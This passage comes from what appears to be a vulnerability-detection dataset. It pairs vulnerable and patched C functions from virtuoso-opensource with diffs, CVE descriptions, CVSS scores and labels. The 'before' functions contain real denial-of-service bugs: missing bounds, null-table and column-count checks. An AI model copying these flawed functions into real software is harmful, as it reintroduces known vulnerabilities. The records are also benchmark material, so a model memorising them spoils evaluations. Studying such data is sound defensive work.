		int VAR_4, int VAR_5, int VAR_6, int VAR_7, caddr_t * VAR_8)
{
  caddr_t VAR_9, VAR_10;
  client_connection_t *VAR_11 = VAR_0->qi_client;
  caddr_t VAR_12[VAR_13];

  caddr_t VAR_14;
  key_id_t VAR_15;
  int VAR_16 = BOX_ELEMENTS (VAR_3);
  int VAR_17 = VAR_16;
  int VAR_18 = VAR_16, VAR_19;
  local_cursor_t *VAR_20;
  local_cursor_t *VAR_21;
  int VAR_22, VAR_23;
  char *VAR_24;
  dk_set_t VAR_25 = NULL;

  if (VAR_16 > VAR_13)
    sqlr_new_error (""42S12"", ""SQ017"", ""Too many key parts"");
  memcpy (VAR_12, VAR_3, box_length ((caddr_t) VAR_3));

  qr_rec_exec (VAR_26, VAR_11, &VAR_20, VAR_0, NULL, 1,
      "":0"", VAR_2, VAR_27);
  if (!lc_next (VAR_20))
    {
      lc_free (VAR_20);
      sqlr_new_error (""42S12"", ""SQ017"",
	  ""No primary key for %s. Specify qualifier and owner if you are not owner of the table."", VAR_2);
    }
  VAR_22 = (int) unbox (lc_get_col (VAR_20, ""K.KEY_N_SIGNIFICANT""));
  VAR_23 = (int) unbox (lc_get_col (VAR_20, ""K.KEY_ID""));
  VAR_24  = box_string((VAR_28 == VAR_29) ? lc_get_col (VAR_20, ""K.KEY_TABLE"") : VAR_2);
  lc_free (VAR_20);

  ddl_check_duplicate_cols (NULL, VAR_3);

  qr_rec_exec (VAR_30, VAR_11, &VAR_21, VAR_0, NULL, 2,
      "":ID"", (ptrlong) VAR_23, VAR_31,
      "":LIMIT"", (ptrlong) VAR_22, VAR_31);
  while (lc_next (VAR_21))
    {
      /* COMMENT_0 */
      /* COMMENT_1 */
      char *VAR_32 = box_string (lc_get_col (VAR_21, ""C.COLUMN""));
      if (KO_NO_PK (VAR_8))
	goto already_in;
      for (VAR_19 = 0; VAR_19 < VAR_16; VAR_19++)
	if (0 == CASEMODESTRCMP (VAR_32, VAR_3[VAR_19]))
	  {
	    dk_free_box (VAR_32);
	    goto already_in;
	  }

      dk_set_push (&VAR_25, VAR_32);
      VAR_12[VAR_18++] = VAR_32;
    already_in:;
    }
  lc_free (VAR_21);

  VAR_14 = dk_alloc_box (VAR_18 * sizeof (caddr_t),
      VAR_33);
  memcpy (VAR_14, VAR_12, VAR_18 * sizeof (caddr_t));


  ddl_insert_sec_key_parts (VAR_0, (key_id_t) VAR_23, VAR_24, VAR_1, (caddr_t *) VAR_14,
      VAR_4, &VAR_15, VAR_5, VAR_6, VAR_17);

  dk_free_tree (list_to_array (VAR_25));
  dk_free_box (VAR_14);

  ddl_key_options (VAR_0, VAR_24, VAR_15, VAR_8);
  if (VAR_6)
    ddl_key_opt (VAR_0, VAR_24, VAR_15);
  ddl_table_changed (VAR_0, VAR_24);
  VAR_9 = box_dv_short_string (VAR_2);
  VAR_10 = box_dv_short_string (VAR_1);
  inx_opt_cluster (VAR_0, VAR_9, VAR_10, VAR_8);
  dk_free_box (VAR_9);
  dk_free_box (VAR_10);

  {
    dbe_table_t *VAR_34 = qi_name_to_table (VAR_0, VAR_24);
    if (VAR_34)
      ddl_create_subtable_keys (VAR_0, VAR_34, VAR_1, VAR_15, VAR_15);
  }
  dk_free_box(VAR_24);
}",openlink/virtuoso-opensource/ea8b2c975c6c96f36e34014d6c71a73761198ebe/ddlrun.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -18,6 +18,8 @@
   char *szTheTableName;
   dk_set_t to_free = NULL;
 
+  if (n_parts > K_MAX_PARTS)
+    sqlr_new_error (""42S12"", ""SQ017"", ""Too many key parts"");
   memcpy (parts_tmp, parts, box_length ((caddr_t) parts));
 
   qr_rec_exec (find_primary_stmt, cli, &lc_keys, qi, NULL, 1,","{'deleted_lines': [], 'added_lines': ['  if (n_parts > K_MAX_PARTS)', '    sqlr_new_error (""42S12"", ""SQ017"", ""Too many key parts"");']}",True,An issue in the __libc_malloc component of openlink virtuoso-opensource v7.2.9 allows attackers to cause a Denial of Service (DoS) via crafted SQL statements.,7.5,HIGH,2,valid,2023-04-13T12:08:01Z,4
CVE-2023-31616,['CWE-89'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,openlink/virtuoso-opensource,Fixed 64bit arith exception (fixes #1122),25fff0eaa85898004bb14909e9f29d16b2918792,https://github.com/openlink/virtuoso-opensource/commit/25fff0eaa85898004bb14909e9f29d16b2918792,libsrc/Wi/sqlbif.c,bif_mod,"caddr_t
bif_mod (caddr_t * qst, caddr_t * err_ret, state_slot_t ** args)
{
int isnull1 = 0, isnull2 = 0;
int64 long1 = bif_long_or_null_arg (qst, args, 0, ""mod"", &isnull1);
int64 long2 = bif_long_or_null_arg (qst, args, 1, ""mod"", &isnull2);
if (isnull1 || isnull2)
return (NEW_DB_NULL);
if (0 == long2)
{
sqlr_new_error (""22012"", ""SR046"", ""Division by zero in mod("" BOXINT_FMT "","" BOXINT_FMT "")"",
(boxint)long1, (boxint)long2);
}
return (box_num (long1 % long2));
}","caddr_t
bif_mod (caddr_t * VAR_0, caddr_t * VAR_1, state_slot_t ** VAR_2)
{
int VAR_3 = 0, VAR_4 = 0;
int64 VAR_5 = bif_long_or_null_arg (VAR_0, VAR_2, 0, ""mod"", &VAR_3);
int64 VAR_6 = bif_long_or_null_arg (VAR_0, VAR_2, 1, ""mod"", &VAR_4);
if (VAR_3 || VAR_4)
return (VAR_7);
if (0 == VAR_6)
{
sqlr_new_error (""22012"", ""SR046"", ""Division by zero in mod("" VAR_8 "","" VAR_8 "")"",
(boxint)VAR_5, (boxint)VAR_6);
}
return (box_num (VAR_5 % VAR_6));
}",openlink/virtuoso-opensource/25fff0eaa85898004bb14909e9f29d16b2918792/sqlbif.c/vul/before/0.json,"caddr_t
bif_mod (caddr_t * qst, caddr_t * err_ret, state_slot_t ** args)
{
  int isnull1 = 0, isnull2 = 0;
  int64 long1 = bif_long_or_null_arg (qst, args, 0, ""mod"", &isnull1);
  int64 long2 = bif_long_or_null_arg (qst, args, 1, ""mod"", &isnull2);

  if (isnull1 || isnull2)
    return (NEW_DB_NULL);
  if (0 == long2)
  {
    sqlr_new_error (""22012"", ""SR046"", ""Division by zero in mod("" BOXINT_FMT "","" BOXINT_FMT "")"",
      (boxint)long1, (boxint)long2);
  }
  if (long1 <= INT64_MIN)
    sqlr_new_error (""22012"", ""SR046"", ""Out of range in mod("" BOXINT_FMT "","" BOXINT_FMT "")"",
      (boxint)long1, (boxint)long2);

  return (box_num (long1 % long2));
}","caddr_t
bif_mod (caddr_t * VAR_0, caddr_t * VAR_1, state_slot_t ** VAR_2)
{
  int VAR_3 = 0, VAR_4 = 0;
  int64 VAR_5 = bif_long_or_null_arg (VAR_0, VAR_2, 0, ""mod"", &VAR_3);
  int64 VAR_6 = bif_long_or_null_arg (VAR_0, VAR_2, 1, ""mod"", &VAR_4);

  if (VAR_3 || VAR_4)
    return (VAR_7);
  if (0 == VAR_6)
  {
    sqlr_new_error (""22012"", ""SR046"", ""Division by zero in mod("" VAR_8 "","" VAR_8 "")"",
      (boxint)VAR_5, (boxint)VAR_6);
  }
  if (VAR_5 <= VAR_9)
    sqlr_new_error (""22012"", ""SR046"", ""Out of range in mod("" VAR_8 "","" VAR_8 "")"",
      (boxint)VAR_5, (boxint)VAR_6);

  return (box_num (VAR_5 % VAR_6));
}",openlink/virtuoso-opensource/25fff0eaa85898004bb14909e9f29d16b2918792/sqlbif.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -12,6 +12,9 @@
     sqlr_new_error (""22012"", ""SR046"", ""Division by zero in mod("" BOXINT_FMT "","" BOXINT_FMT "")"",
       (boxint)long1, (boxint)long2);
   }
+  if (long1 <= INT64_MIN)
+    sqlr_new_error (""22012"", ""SR046"", ""Out of range in mod("" BOXINT_FMT "","" BOXINT_FMT "")"",
+      (boxint)long1, (boxint)long2);
 
   return (box_num (long1 % long2));
 }","{'deleted_lines': [], 'added_lines': ['  if (long1 <= INT64_MIN)', '    sqlr_new_error (""22012"", ""SR046"", ""Out of range in mod("" BOXINT_FMT "","" BOXINT_FMT "")"",', '      (boxint)long1, (boxint)long2);']}",True,An issue in the bif_mod component of openlink virtuoso-opensource v7.2.9 allows attackers to cause a Denial of Service (DoS) via crafted SQL statements.,7.5,HIGH,2,valid,2023-04-13T12:12:56Z,4
CVE-2023-31622,['CWE-89'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,openlink/virtuoso-opensource,Fixed missing check for table in positioned delete (fixes #1135),db91dc5602a8cfde2e4e1d00387d5ba4b77389dc,https://github.com/openlink/virtuoso-opensource/commit/db91dc5602a8cfde2e4e1d00387d5ba4b77389dc,libsrc/Wi/sqlstmts.c,sqlc_delete_pos,"void
sqlc_delete_pos (sql_comp_t * sc, ST * tree, subq_compilation_t * cursor_sqc, ST ** src_ret)
{
dbe_table_t *tb = sch_name_to_table (wi_inst.wi_schema,
tree->_.delete_pos.table->_.table.name);
sqlc_table_used (sc, tb);
if (tb && (tb->tb_primary_key->key_is_col || find_remote_table (tb->tb_name, 0) || (tb->tb_primary_key->key_partition && !sqlo_opt_value (tree->_.delete_pos.opts, OPT_NO_CLUSTER))))
{
if (!src_ret)
sqlc_new_error (sc->sc_cc, ""37000"", ""NOPOS"", ""Positioned statement is allowed only in procedures"");
*src_ret = sqlc_delete_cl_pos (sc, tree, cursor_sqc);
return;
}
else
{
trig_cols_t tc;
SQL_NODE_INIT (delete_node_t, del, delete_node_input, del_free);
if (tb && !sec_tb_check (tb, SC_G_ID (sc), SC_U_ID (sc), GR_DELETE))
sqlc_new_error (sc->sc_cc, ""43000"", ""SQ108:SECURITY"", ""Permission denied for delete from %.300s (user ID = %lu)"", tb->tb_name, SC_U_ID (sc));
del->del_table = tb;
del->del_policy_qr = sqlc_make_policy_trig (sc->sc_cc, tb, TB_RLS_D);
del->del_place = cursor_sqc
? cursor_sqc->sqc_ssl
: sqlc_make_co_node (sc, tree->_.delete_pos.cursor, tb);
if (!del->del_place)
sqlc_new_error (sc->sc_cc, ""09000"", ""SQ109"",
""Cursor with a sorted order by, distinct, grouping etc. ""
""is not referenceable in 'delete from %.200s where current of ...'"", tb->tb_name );
tc_init (&tc, TRIG_DELETE, tb, NULL, NULL, NULL);
if (tc.tc_is_trigger)
{
dk_set_t code = NULL;
state_slot_t ** slots;
sqlc_pl_selection (sc, tb, del->del_place, tc.tc_selection, &slots);
sqlc_trig_const_params (sc, slots, &code);
del->del_trigger_args = slots;
del->src_gen.src_pre_code = code_to_cv (sc, code);
}
tc_free (&tc);
sql_node_append (&sc->sc_cc->cc_query->qr_head_node,
(data_source_t *) del);
}
}","void
sqlc_delete_pos (sql_comp_t * VAR_0, ST * VAR_1, subq_compilation_t * VAR_2, ST ** VAR_3)
{
dbe_table_t *VAR_4 = sch_name_to_table (VAR_5.wi_schema,
VAR_1->_.delete_pos.table->_.table.name);
sqlc_table_used (VAR_0, VAR_4);
if (VAR_4 && (VAR_4->tb_primary_key->key_is_col || find_remote_table (VAR_4->tb_name, 0) || (VAR_4->tb_primary_key->key_partition && !sqlo_opt_value (VAR_1->_.delete_pos.opts, VAR_6))))
{
if (!VAR_3)
sqlc_new_error (VAR_0->sc_cc, ""37000"", ""NOPOS"", ""Positioned statement is allowed only in procedures"");
*VAR_3 = sqlc_delete_cl_pos (VAR_0, VAR_1, VAR_2);
return;
}
else
{
trig_cols_t VAR_7;
SQL_NODE_INIT (VAR_8, VAR_9, VAR_10, VAR_11);
if (VAR_4 && !sec_tb_check (VAR_4, SC_G_ID (VAR_0), SC_U_ID (VAR_0), VAR_12))
sqlc_new_error (VAR_0->sc_cc, ""43000"", ""SQ108:SECURITY"", ""Permission denied for delete from %.300s (user ID = %lu)"", VAR_4->tb_name, SC_U_ID (VAR_0));
VAR_9->del_table = VAR_4;
VAR_9->del_policy_qr = sqlc_make_policy_trig (VAR_0->sc_cc, VAR_4, VAR_13);
VAR_9->del_place = VAR_2
? VAR_2->sqc_ssl
: sqlc_make_co_node (VAR_0, VAR_1->_.delete_pos.cursor, VAR_4);
if (!VAR_9->del_place)
sqlc_new_error (VAR_0->sc_cc, ""09000"", ""SQ109"",
""Cursor with a sorted order by, distinct, grouping etc. ""
""is not referenceable in 'delete from %.200s where current of ...'"", VAR_4->tb_name );
tc_init (&VAR_7, VAR_14, VAR_4, NULL, NULL, NULL);
if (VAR_7.tc_is_trigger)
{
dk_set_t VAR_15 = NULL;
state_slot_t ** VAR_16;
sqlc_pl_selection (VAR_0, VAR_4, VAR_9->del_place, VAR_7.tc_selection, &VAR_16);
sqlc_trig_const_params (VAR_0, VAR_16, &VAR_15);
VAR_9->del_trigger_args = VAR_16;
VAR_9->src_gen.src_pre_code = code_to_cv (VAR_0, VAR_15);
}
tc_free (&VAR_7);
sql_node_append (&VAR_0->sc_cc->cc_query->qr_head_node,
(data_source_t *) VAR_9);
}
}",openlink/virtuoso-opensource/db91dc5602a8cfde2e4e1d00387d5ba4b77389dc/sqlstmts.c/vul/before/0.json,"void
sqlc_delete_pos (sql_comp_t * sc, ST * tree, subq_compilation_t * cursor_sqc, ST ** src_ret)
{
  dbe_table_t *tb = sch_name_to_table (wi_inst.wi_schema,
      tree->_.delete_pos.table->_.table.name);
  sqlc_table_used (sc, tb);
  if (tb && (tb->tb_primary_key->key_is_col || find_remote_table (tb->tb_name, 0) || (tb->tb_primary_key->key_partition && !sqlo_opt_value (tree->_.delete_pos.opts, OPT_NO_CLUSTER))))
    {
      if (!src_ret)
	sqlc_new_error (sc->sc_cc, ""37000"", ""NOPOS"", ""Positioned statement is allowed only in procedures"");
      *src_ret = sqlc_delete_cl_pos (sc, tree, cursor_sqc);
      return;
    }
  else
    {
      trig_cols_t tc;
      SQL_NODE_INIT (delete_node_t, del, delete_node_input, del_free);
      if (tb && !sec_tb_check (tb, SC_G_ID (sc), SC_U_ID (sc), GR_DELETE))
	sqlc_new_error (sc->sc_cc, ""43000"", ""SQ108:SECURITY"", ""Permission denied for delete from %.300s (user ID = %lu)"", tb->tb_name, SC_U_ID (sc));
      if (!tb)
        sqlc_new_error (sc->sc_cc, ""42S02"", ""NOTBL"", ""No table '%s' for positioned statement"", tree->_.delete_pos.table->_.table.name);

      del->del_table = tb;
      del->del_policy_qr = sqlc_make_policy_trig (sc->sc_cc, tb, TB_RLS_D);
      del->del_place = cursor_sqc
	? cursor_sqc->sqc_ssl
	  : sqlc_make_co_node (sc, tree->_.delete_pos.cursor, tb);
      if (!del->del_place)
	sqlc_new_error (sc->sc_cc, ""09000"", ""SQ109"",
	    ""Cursor with a sorted order by, distinct, grouping etc. ""
	    ""is not referenceable in 'delete from %.200s where current of ...'"", tb->tb_name );
      tc_init (&tc, TRIG_DELETE, tb, NULL, NULL, NULL);
      if (tc.tc_is_trigger)
	{
	  dk_set_t code = NULL;
	  state_slot_t ** slots;
	  sqlc_pl_selection (sc, tb, del->del_place, tc.tc_selection, &slots);
	  sqlc_trig_const_params (sc, slots, &code);
	  del->del_trigger_args = slots;
	  del->src_gen.src_pre_code = code_to_cv (sc, code);
	}
      tc_free (&tc);
      sql_node_append (&sc->sc_cc->cc_query->qr_head_node,
	  (data_source_t *) del);
    }
}","void
sqlc_delete_pos (sql_comp_t * VAR_0, ST * VAR_1, subq_compilation_t * VAR_2, ST ** VAR_3)
{
  dbe_table_t *VAR_4 = sch_name_to_table (VAR_5.wi_schema,
      VAR_1->_.delete_pos.table->_.table.name);
  sqlc_table_used (VAR_0, VAR_4);
  if (VAR_4 && (VAR_4->tb_primary_key->key_is_col || find_remote_table (VAR_4->tb_name, 0) || (VAR_4->tb_primary_key->key_partition && !sqlo_opt_value (VAR_1->_.delete_pos.opts, VAR_6))))
    {
      if (!VAR_3)
	sqlc_new_error (VAR_0->sc_cc, ""37000"", ""NOPOS"", ""Positioned statement is allowed only in procedures"");
      *VAR_3 = sqlc_delete_cl_pos (VAR_0, VAR_1, VAR_2);
      return;
    }
  else
    {
      trig_cols_t VAR_7;
      SQL_NODE_INIT (VAR_8, VAR_9, VAR_10, VAR_11);
      if (VAR_4 && !sec_tb_check (VAR_4, SC_G_ID (VAR_0), SC_U_ID (VAR_0), VAR_12))
	sqlc_new_error (VAR_0->sc_cc, ""43000"", ""SQ108:SECURITY"", ""Permission denied for delete from %.300s (user ID = %lu)"", VAR_4->tb_name, SC_U_ID (VAR_0));
      if (!VAR_4)
        sqlc_new_error (VAR_0->sc_cc, ""42S02"", ""NOTBL"", ""No table '%s' for positioned statement"", VAR_1->_.delete_pos.table->_.table.name);

      VAR_9->del_table = VAR_4;
      VAR_9->del_policy_qr = sqlc_make_policy_trig (VAR_0->sc_cc, VAR_4, VAR_13);
      VAR_9->del_place = VAR_2
	? VAR_2->sqc_ssl
	  : sqlc_make_co_node (VAR_0, VAR_1->_.delete_pos.cursor, VAR_4);
      if (!VAR_9->del_place)
	sqlc_new_error (VAR_0->sc_cc, ""09000"", ""SQ109"",
	    ""Cursor with a sorted order by, distinct, grouping etc. ""
	    ""is not referenceable in 'delete from %.200s where current of ...'"", VAR_4->tb_name );
      tc_init (&VAR_7, VAR_14, VAR_4, NULL, NULL, NULL);
      if (VAR_7.tc_is_trigger)
	{
	  dk_set_t VAR_15 = NULL;
	  state_slot_t ** VAR_16;
	  sqlc_pl_selection (VAR_0, VAR_4, VAR_9->del_place, VAR_7.tc_selection, &VAR_16);
	  sqlc_trig_const_params (VAR_0, VAR_16, &VAR_15);
	  VAR_9->del_trigger_args = VAR_16;
	  VAR_9->src_gen.src_pre_code = code_to_cv (VAR_0, VAR_15);
	}
      tc_free (&VAR_7);
      sql_node_append (&VAR_0->sc_cc->cc_query->qr_head_node,
	  (data_source_t *) VAR_9);
    }
}",openlink/virtuoso-opensource/db91dc5602a8cfde2e4e1d00387d5ba4b77389dc/sqlstmts.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -17,6 +17,8 @@
       SQL_NODE_INIT (delete_node_t, del, delete_node_input, del_free);
       if (tb && !sec_tb_check (tb, SC_G_ID (sc), SC_U_ID (sc), GR_DELETE))
 	sqlc_new_error (sc->sc_cc, ""43000"", ""SQ108:SECURITY"", ""Permission denied for delete from %.300s (user ID = %lu)"", tb->tb_name, SC_U_ID (sc));
+      if (!tb)
+        sqlc_new_error (sc->sc_cc, ""42S02"", ""NOTBL"", ""No table '%s' for positioned statement"", tree->_.delete_pos.table->_.table.name);
 
       del->del_table = tb;
       del->del_policy_qr = sqlc_make_policy_trig (sc->sc_cc, tb, TB_RLS_D);","{'deleted_lines': [], 'added_lines': ['      if (!tb)', '        sqlc_new_error (sc->sc_cc, ""42S02"", ""NOTBL"", ""No table \'%s\' for positioned statement"", tree->_.delete_pos.table->_.table.name);']}",True,An issue in the sqlc_make_policy_trig component of openlink virtuoso-opensource v7.2.9 allows attackers to cause a Denial of Service (DoS) via crafted SQL statements.,7.5,HIGH,2,valid,2023-04-13T12:57:43Z,4
CVE-2023-31624,['CWE-89'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,openlink/virtuoso-opensource,Fixed check number of values vs cols when inserting into view (fixes #1134),311097fb1f23d0a1dd7dcdd2afecf6fe14665526,https://github.com/openlink/virtuoso-opensource/commit/311097fb1f23d0a1dd7dcdd2afecf6fe14665526,libsrc/Wi/sqlview.c,sqlc_insert_view,"void
sqlc_insert_view (sql_comp_t * sc, ST * view, ST * tree, dbe_table_t * tb)
{
int inx;
ST **cols = tree->_.insert.cols;
dk_set_t aliases = NULL;
dk_set_t new_cols = NULL, new_vals = NULL;
if (!sqlc_view_is_updatable (view))
sqlc_new_error (sc->sc_cc, ""37000"", ""SQ114"",
""View %s is not updatable in insert."", tb->tb_name);
tree->_.insert.table = (ST *) t_box_copy_tree (
(caddr_t) view->_.select_stmt.table_exp->_.table_exp.from[0]->_.table_ref.table);
_DO_BOX (inx, tree->_.insert.cols)
{
sqlc_col_to_view_scope (sc, &cols[inx], view, &aliases);
if (!ST_P (tree->_.insert.vals, SELECT_STMT))
sinv_sqlo_check_col_val (&cols[inx],
&(tree->_.insert.vals->_.ins_vals.vals[inx]),
&new_cols, &new_vals);
}
END_DO_BOX;
if (new_cols)
{
ST ** new_cols_box = (ST **) t_alloc_box (
(BOX_ELEMENTS (cols) + dk_set_length (new_cols)) * sizeof (caddr_t),
DV_ARRAY_OF_POINTER);
ST ** new_vals_box = (ST **) t_alloc_box (
(BOX_ELEMENTS (cols) + dk_set_length (new_cols)) * sizeof (caddr_t),
DV_ARRAY_OF_POINTER);
memcpy (new_cols_box, cols, box_length (cols));
memcpy (new_vals_box, tree->_.insert.vals->_.ins_vals.vals, box_length (cols));
inx = BOX_ELEMENTS (cols);
DO_SET (ST *, new_col, &new_cols)
{
new_cols_box[inx] = new_col;
new_vals_box[inx] = (ST *) new_vals->data;
new_vals = new_vals->next;
inx ++;
}
END_DO_SET ();
tree->_.insert.cols = cols = new_cols_box;
tree->_.insert.vals->_.ins_vals.vals = new_vals_box;
}
_DO_BOX (inx, tree->_.insert.cols)
{
if (ST_COLUMN (cols[inx], COL_DOTTED))
{
ST *c = (ST *) t_box_copy_tree (cols[inx]->_.col_ref.name);
cols[inx] = c;
}
else
{
sqlc_new_error (sc->sc_cc, ""37000"", ""SQ115"",
""Non-updatable column in view %s (expression or constant)"",
tb->tb_name);
}
}
END_DO_BOX;
sc->sc_col_ref_recs = t_NCONC (aliases, sc->sc_col_ref_recs);
sqlc_insert (sc, tree);
}","void
sqlc_insert_view (sql_comp_t * VAR_0, ST * VAR_1, ST * VAR_2, dbe_table_t * VAR_3)
{
int VAR_4;
ST **VAR_5 = VAR_2->_.insert.cols;
dk_set_t VAR_6 = NULL;
dk_set_t VAR_7 = NULL, VAR_8 = NULL;
if (!sqlc_view_is_updatable (VAR_1))
sqlc_new_error (VAR_0->sc_cc, ""37000"", ""SQ114"",
""View %s is not updatable in insert."", VAR_3->tb_name);
VAR_2->_.insert.table = (ST *) t_box_copy_tree (
(caddr_t) VAR_1->_.select_stmt.table_exp->_.table_exp.from[0]->_.table_ref.table);
_DO_BOX (VAR_4, VAR_2->_.insert.cols)
{
sqlc_col_to_view_scope (VAR_0, &VAR_5[VAR_4], VAR_1, &VAR_6);
if (!ST_P (VAR_2->_.insert.vals, VAR_9))
sinv_sqlo_check_col_val (&VAR_5[VAR_4],
&(VAR_2->_.insert.vals->_.ins_vals.vals[VAR_4]),
&VAR_7, &VAR_8);
}
VAR_10;
if (VAR_7)
{
ST ** VAR_11 = (ST **) t_alloc_box (
(BOX_ELEMENTS (VAR_5) + dk_set_length (VAR_7)) * sizeof (caddr_t),
VAR_12);
ST ** VAR_13 = (ST **) t_alloc_box (
(BOX_ELEMENTS (VAR_5) + dk_set_length (VAR_7)) * sizeof (caddr_t),
VAR_12);
memcpy (VAR_11, VAR_5, box_length (VAR_5));
memcpy (VAR_13, VAR_2->_.insert.vals->_.ins_vals.vals, box_length (VAR_5));
VAR_4 = BOX_ELEMENTS (VAR_5);
VAR_14 (ST *, VAR_15, &VAR_7)
{
VAR_11[VAR_4] = VAR_15;
VAR_13[VAR_4] = (ST *) VAR_8->data;
VAR_8 = VAR_8->next;
VAR_4 ++;
}
END_DO_SET ();
VAR_2->_.insert.cols = VAR_5 = VAR_11;
VAR_2->_.insert.vals->_.ins_vals.vals = VAR_13;
}
_DO_BOX (VAR_4, VAR_2->_.insert.cols)
{
if (ST_COLUMN (VAR_5[VAR_4], VAR_16))
{
ST *VAR_17 = (ST *) t_box_copy_tree (VAR_5[VAR_4]->_.col_ref.name);
VAR_5[VAR_4] = VAR_17;
}
else
{
sqlc_new_error (VAR_0->sc_cc, ""37000"", ""SQ115"",
""Non-updatable column in view %s (expression or constant)"",
VAR_3->tb_name);
}
}
VAR_10;
VAR_0->sc_col_ref_recs = t_NCONC (VAR_6, VAR_0->sc_col_ref_recs);
sqlc_insert (VAR_0, VAR_2);
}",openlink/virtuoso-opensource/311097fb1f23d0a1dd7dcdd2afecf6fe14665526/sqlview.c/vul/before/0.json,"void
sqlc_insert_view (sql_comp_t * sc, ST * view, ST * tree, dbe_table_t * tb)
{
  /*oid_t ref_g_id = unbox (tree->_.insert.table->_.table.g_id);
  oid_t ref_u_id = unbox (tree->_.insert.table->_.table.u_id);*/

  int inx;
  ST **cols = tree->_.insert.cols;
  dk_set_t aliases = NULL;
  dk_set_t new_cols = NULL, new_vals = NULL;

  if (!sqlc_view_is_updatable (view))
    sqlc_new_error (sc->sc_cc, ""37000"", ""SQ114"",
	""View %s is not updatable in insert."", tb->tb_name);

  /*dk_free_tree ((caddr_t) tree->_.insert.table);*/
  tree->_.insert.table = (ST *) t_box_copy_tree (
      (caddr_t) view->_.select_stmt.table_exp->_.table_exp.from[0]->_.table_ref.table);

  if (BOX_ELEMENTS_0(cols) != BOX_ELEMENTS_0(tree->_.insert.vals->_.ins_vals.vals))
    sqlc_new_error (sc->sc_cc, ""21S01"", ""SQ099"",
	""different number of cols and values in insert."");

  _DO_BOX (inx, tree->_.insert.cols)
    {
      sqlc_col_to_view_scope (sc, &cols[inx], view, &aliases);
      if (!ST_P (tree->_.insert.vals, SELECT_STMT))
	sinv_sqlo_check_col_val (&cols[inx],
	    &(tree->_.insert.vals->_.ins_vals.vals[inx]),
	    &new_cols, &new_vals);
    }
  END_DO_BOX;

  if (new_cols)
    {
      ST ** new_cols_box = (ST **) t_alloc_box (
	  (BOX_ELEMENTS (cols) + dk_set_length (new_cols)) * sizeof (caddr_t),
	  DV_ARRAY_OF_POINTER);
      ST ** new_vals_box = (ST **) t_alloc_box (
	  (BOX_ELEMENTS (cols) + dk_set_length (new_cols)) * sizeof (caddr_t),
	  DV_ARRAY_OF_POINTER);
      memcpy (new_cols_box, cols, box_length (cols));
      memcpy (new_vals_box, tree->_.insert.vals->_.ins_vals.vals, box_length (cols));
      inx = BOX_ELEMENTS (cols);
      DO_SET (ST *, new_col, &new_cols)
	{
	  new_cols_box[inx] = new_col;
	  new_vals_box[inx] = (ST *) new_vals->data;
	  new_vals = new_vals->next;
	  inx ++;
	}
      END_DO_SET ();
      tree->_.insert.cols = cols = new_cols_box;
      tree->_.insert.vals->_.ins_vals.vals = new_vals_box;
    }

  _DO_BOX (inx, tree->_.insert.cols)
    {
      if (ST_COLUMN (cols[inx], COL_DOTTED))
	{
	  ST *c = (ST *) t_box_copy_tree (cols[inx]->_.col_ref.name);
	  /*dk_free_tree (cols[inx]);*/
	  cols[inx] = c;
	}
      else
	{
	  sqlc_new_error (sc->sc_cc, ""37000"", ""SQ115"",
	      ""Non-updatable column in view %s (expression or constant)"",
	      tb->tb_name);
	}
    }
  END_DO_BOX;


  sc->sc_col_ref_recs = t_NCONC (aliases, sc->sc_col_ref_recs);
  sqlc_insert (sc, tree);
}","void
sqlc_insert_view (sql_comp_t * VAR_0, ST * VAR_1, ST * VAR_2, dbe_table_t * VAR_3)
{
  /* COMMENT_0 */
                                                                

  int VAR_4;
  ST **VAR_5 = VAR_2->_.insert.cols;
  dk_set_t VAR_6 = NULL;
  dk_set_t VAR_7 = NULL, VAR_8 = NULL;

  if (!sqlc_view_is_updatable (VAR_1))
    sqlc_new_error (VAR_0->sc_cc, ""37000"", ""SQ114"",
	""View %s is not updatable in insert."", VAR_3->tb_name);

  /* COMMENT_2 */
  VAR_2->_.insert.table = (ST *) t_box_copy_tree (
      (caddr_t) VAR_1->_.select_stmt.table_exp->_.table_exp.from[0]->_.table_ref.table);

  if (BOX_ELEMENTS_0(VAR_5) != BOX_ELEMENTS_0(VAR_2->_.insert.vals->_.ins_vals.vals))
    sqlc_new_error (VAR_0->sc_cc, ""21S01"", ""SQ099"",
	""different number of cols and values in insert."");

  _DO_BOX (VAR_4, VAR_2->_.insert.cols)
    {
      sqlc_col_to_view_scope (VAR_0, &VAR_5[VAR_4], VAR_1, &VAR_6);
      if (!ST_P (VAR_2->_.insert.vals, VAR_9))
	sinv_sqlo_check_col_val (&VAR_5[VAR_4],
	    &(VAR_2->_.insert.vals->_.ins_vals.vals[VAR_4]),
	    &VAR_7, &VAR_8);
    }
  VAR_10;

  if (VAR_7)
    {
      ST ** VAR_11 = (ST **) t_alloc_box (
	  (BOX_ELEMENTS (VAR_5) + dk_set_length (VAR_7)) * sizeof (caddr_t),
	  VAR_12);
      ST ** VAR_13 = (ST **) t_alloc_box (
	  (BOX_ELEMENTS (VAR_5) + dk_set_length (VAR_7)) * sizeof (caddr_t),
	  VAR_12);
      memcpy (VAR_11, VAR_5, box_length (VAR_5));
      memcpy (VAR_13, VAR_2->_.insert.vals->_.ins_vals.vals, box_length (VAR_5));
      VAR_4 = BOX_ELEMENTS (VAR_5);
      VAR_14 (ST *, VAR_15, &VAR_7)
	{
	  VAR_11[VAR_4] = VAR_15;
	  VAR_13[VAR_4] = (ST *) VAR_8->data;
	  VAR_8 = VAR_8->next;
	  VAR_4 ++;
	}
      END_DO_SET ();
      VAR_2->_.insert.cols = VAR_5 = VAR_11;
      VAR_2->_.insert.vals->_.ins_vals.vals = VAR_13;
    }

  _DO_BOX (VAR_4, VAR_2->_.insert.cols)
    {
      if (ST_COLUMN (VAR_5[VAR_4], VAR_16))
	{
	  ST *VAR_17 = (ST *) t_box_copy_tree (VAR_5[VAR_4]->_.col_ref.name);
	  /* COMMENT_3 */
	  VAR_5[VAR_4] = VAR_17;
	}
      else
	{
	  sqlc_new_error (VAR_0->sc_cc, ""37000"", ""SQ115"",
	      ""Non-updatable column in view %s (expression or constant)"",
	      VAR_3->tb_name);
	}
    }
  VAR_10;


  VAR_0->sc_col_ref_recs = t_NCONC (VAR_6, VAR_0->sc_col_ref_recs);
  sqlc_insert (VAR_0, VAR_2);
